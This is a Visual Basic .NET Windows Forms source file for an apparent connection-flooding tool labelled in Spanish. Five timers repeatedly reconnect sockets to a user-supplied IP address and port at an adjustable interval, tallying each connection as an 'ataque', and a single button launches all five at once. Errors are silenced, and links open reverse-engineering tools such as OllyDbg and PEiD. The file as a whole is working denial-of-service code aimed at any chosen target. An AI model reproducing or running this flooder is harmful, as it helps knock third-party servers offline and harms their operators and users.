Public Class Main
    Dim TimAll As Integer = 0
    Private Sub Main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer1.Enabled = True
    End Sub

    Private Declare Function ReleaseCapture Lib "user32" () As Long
    Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
            (ByVal hwnd As Long, _
             ByVal wMsg As Long, _
             ByVal wParam As Integer, _
             ByVal lParam As String) As Long

    Private Sub T1_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T1.Tick
        On Error Resume Next
        W1.Close()
        W1.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques1.Text = txt_ataques1.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub T2_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T2.Tick
        On Error Resume Next
        W2.Close()
        W2.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques2.Text = txt_ataques2.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub T3_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T3.Tick
        On Error Resume Next
        W3.Close()
        W3.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques3.Text = txt_ataques3.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub T4_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T4.Tick
        On Error Resume Next
        W4.Close()
        W4.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques4.Text = txt_ataques4.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub T5_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T5.Tick
        On Error Resume Next
        W5.Close()
        W5.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques5.Text = txt_ataques5.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub L1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles intervalo.ValueChanged


        T1.Interval = CInt(intervalo.Value)
        T2.Interval = CInt(intervalo.Value)
        T3.Interval = CInt(intervalo.Value)
        T4.Interval = CInt(intervalo.Value)
        T5.Interval = CInt(intervalo.Value)



    End Sub
    Private Sub btn1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn1.Click
        On Error Resume Next
        If txt_ataques1.Enabled = False Then
            T1.Interval = CInt(intervalo.Value)
            T1.Start()
            Timer.Start()
            txt_ataques1.Enabled = True
            btn1.BackgroundImage = My.Resources.pause
        Else
            txt_ataques1.Enabled = False
            T1.Stop()
            Timer.Stop()
            btn1.BackgroundImage = My.Resources.play
        End If
    End Sub
    Private Sub bnt2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn2.Click
        On Error Resume Next
        If txt_ataques2.Enabled = False Then
            T2.Interval = CInt(intervalo.Value)
            T2.Start()
            Timer.Start()
            txt_ataques2.Enabled = True
            btn2.BackgroundImage = My.Resources.pause
        Else
            txt_ataques2.Enabled = False
            T2.Stop()
            Timer.Stop()
            btn2.BackgroundImage = My.Resources.play
        End If
    End Sub
    Private Sub btn3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn3.Click
        On Error Resume Next
        If txt_ataques3.Enabled = False Then
            T3.Interval = CInt(intervalo.Value)
            T3.Start()
            Timer.Start()
            txt_ataques3.Enabled = True
            btn3.BackgroundImage = My.Resources.pause
        Else
            txt_ataques3.Enabled = False
            T3.Stop()
            Timer.Stop()
            btn3.BackgroundImage = My.Resources.play
        End If

    End Sub
    Private Sub btn4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn4.Click
        On Error Resume Next
        If txt_ataques4.Enabled = False Then
            T4.Interval = CInt(intervalo.Value)
            T4.Start()
            Timer.Start()
            txt_ataques4.Enabled = True
            btn4.BackgroundImage = My.Resources.pause
        Else
            txt_ataques4.Enabled = False
            T4.Stop()
            Timer.Stop()
            btn4.BackgroundImage = My.Resources.play
        End If
    End Sub
    Private Sub btn5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn5.Click
        On Error Resume Next
        If txt_ataques5.Enabled = False Then
            T5.Interval = CInt(intervalo.Value)
            T5.Start()
            Timer.Start()
            txt_ataques5.Enabled = True
            btn5.BackgroundImage = My.Resources.pause
        Else
            txt_ataques5.Enabled = False
            T5.Stop()
            Timer.Stop()
            btn4.BackgroundImage = My.Resources.play
        End If
    End Sub

    Private Sub btn_todos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_todos.Click
        On Error Resume Next
        todo()
    End Sub
    Function todo() As String
        If TimAll = 0 Then
            TimAll = 1
            Timer.Start()
            T1.Interval = CInt(intervalo.Value)
            T1.Start()
            txt_ataques1.Enabled = True

            T2.Interval = CInt(intervalo.Value)
            T2.Start()
            txt_ataques2.Enabled = True

            T3.Interval = CInt(intervalo.Value)
            T3.Start()
            txt_ataques3.Enabled = True

            T4.Interval = CInt(intervalo.Value)
            T4.Start()
            txt_ataques4.Enabled = True

            T5.Interval = CInt(intervalo.Value)
            T5.Start()
            txt_ataques5.Enabled = True
            btn1.BackgroundImage = My.Resources.pause
            btn2.BackgroundImage = My.Resources.pause
            btn3.BackgroundImage = My.Resources.pause
            btn4.BackgroundImage = My.Resources.pause
            btn5.BackgroundImage = My.Resources.pause
            btn_todos.BackgroundImage = My.Resources.stop_alt
        Else
            TimAll = 0
            Timer.Stop()
            txt_ataques1.Enabled = False
            T1.Stop()
            txt_ataques2.Enabled = False
            T2.Stop()
            txt_ataques3.Enabled = False
            T3.Stop()
            txt_ataques4.Enabled = False
            T4.Stop()
            txt_ataques5.Enabled = False
            T5.Stop()
            btn1.BackgroundImage = My.Resources.play
            btn2.BackgroundImage = My.Resources.play
            btn3.BackgroundImage = My.Resources.play
            btn4.BackgroundImage = My.Resources.play
            btn5.BackgroundImage = My.Resources.play
            btn_todos.BackgroundImage = My.Resources.forward_button

        End If

    End Function



    Private Sub Timer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer.Tick
        Tiempo.Text = Tiempo.Text + 1
    End Sub



    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("APPS/OLLYDBG.exe")
    End Sub

    Private Sub LinkLabel2_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Process.Start("APPS/W32DSM.exe")
    End Sub

    Private Sub LinkLabel3_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        Process.Start("APPS/PEID.exe")
    End Sub

    Private Sub LinkLabel6_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel6.LinkClicked
        Process.Start("APPS/SCITE/scite.exe")
    End Sub

    Private Sub LinkLabel5_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel5.LinkClicked
        Process.Start("APPS/NOTEPAD++/NOTEPAD++.exe")
    End Sub

End Class
